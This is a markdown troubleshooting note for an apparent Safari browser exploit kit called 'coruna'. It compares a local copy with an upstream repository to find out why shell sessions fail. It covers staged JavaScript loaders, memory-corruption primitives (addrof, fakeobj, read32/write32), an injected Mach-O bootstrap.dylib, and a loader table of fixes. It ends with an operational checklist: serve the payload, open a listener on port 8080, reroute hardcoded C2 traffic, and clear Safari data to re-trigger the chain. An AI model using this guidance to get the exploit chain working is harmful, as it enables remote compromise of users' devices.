# Payload and Repositories Differential Analysis

Verification between `coruna_repo` (khanhduytran0/coruna) and `exploits/coruna` regarding **payloads** and execution flow. Objective: Ensure modifications do not obstruct the shell and verify payload completeness.

---

## 1. Primary Reasons for Missing Shell Sessions

### 1.1 `payloads/bootstrap.dylib`

- **Stage3_VariantB.js** issues `_xhr.open("GET", "payloads/bootstrap.dylib", false)` and uses the binary response to construct the injected dylib.
- The upstream GitHub repository [khanhduytran0/coruna](https://github.com/khanhduytran0/coruna) contains `payloads/bootstrap.dylib` (89,328 bytes) and `payloads/manifest.json`.
- If `bootstrap.dylib` is missing or served as an empty/404 response, Stage 3 cannot parse the Mach-O binary and fails silently or raises a parsing error, leaving no shell session connected.
- An explicit validation check in **Stage3_VariantB.js** verifies whether `payloads/bootstrap.dylib` returns HTTP 200 and exceeds 1,024 bytes. If not, a clear error message is logged: *"Missing or invalid payloads/bootstrap.dylib ... Add bootstrap.dylib from the Coruna decryption pipeline"*.

### 1.2 Hash-Specific Payload Subdirectories

- **`manifest.json`** lists 19 hashes with multiple sub-entries (e.g. `entry0_type0x08.dylib`, `entry1_type0x09.dylib`, etc.).
- On disk, only three subdirectories exist under `payloads/`, each containing a single file (`entry1_type0x0a.bin`).
- Most secondary payload files referenced in `manifest.json` are not bundled in public distributions. When Stage 3 or the dylib requests missing container components, requests result in HTTP 404s.

---

## 2. Loader Differences (`group.html`)

Comparison between original `group.html` and this repository:

| Feature | Upstream (khanhduytran0) | This Repository | Impact |
|---|---|---|---|
| **`baseUrl`** | `let baseUrl = utilityModule.Ot(fqMaGkNg());` | `let baseUrl = window.location.origin + window.location.pathname;` | Affects resolution of Stage 1/2/3 `.js` modules. Payloads are requested relative to document root (`payloads/...`). |
| **`platformModule.init(...)`** | Identical call with platform and userAgent | Identical | No change. |
| **`obChTK` / `getModuleByURL`** | Bound to global `this` (undefined in IIFE) | Direct function reference | Fixes module resolution for Bluebird. |
| **Primitive Normalization** | Missing in upstream | Maps `tr`, `Mr`, `br`, `dr` to `addrof`, `fakeobj`, `read32`, `write32`, `readByte`, `readDoubleAsPointer` | Required for Stage 3 compatibility with Bluebird. |
| **`sessionStorage` Guard** | Missing | `CORUNA_DONE_KEY` guard | Prevents endless reload crash loops on failure. |

---

## 3. Stage 3 Execution & Payload Loading

- **`fetchBin(url)`**: Uses asynchronous XHR relative to the document URL. Request behavior for `payloads/manifest.json` and `payloads/<hash>/<file>` matches the original implementation.
- **Mach-O Payload Builder**: Arguments originate from `platformModule.platformState`, populated during initialization.
- **Bootstrap Validation**: An explicit HTTP status and size check prevents corrupted Mach-O structures from crashing the browser without actionable feedback.

---

## 4. Operational Checklist for Establishing Sessions

1. **Verify `bootstrap.dylib` Presence**:
   - Ensure `exploits/coruna/payloads/bootstrap.dylib` exists and is served with HTTP 200 status over port 80.
2. **Listener & Firewall**:
   - Verify host port 8080 (TCP) is reachable and unblocked by firewalls.
   - If binaries contain hardcoded C2 addresses, ensure DNS or routing redirects inbound traffic to your listener.
3. **Session Storage Sanitation**:
   - Clear Safari website data or use Private Browsing mode when re-testing to bypass the `sessionStorage` execution guard.
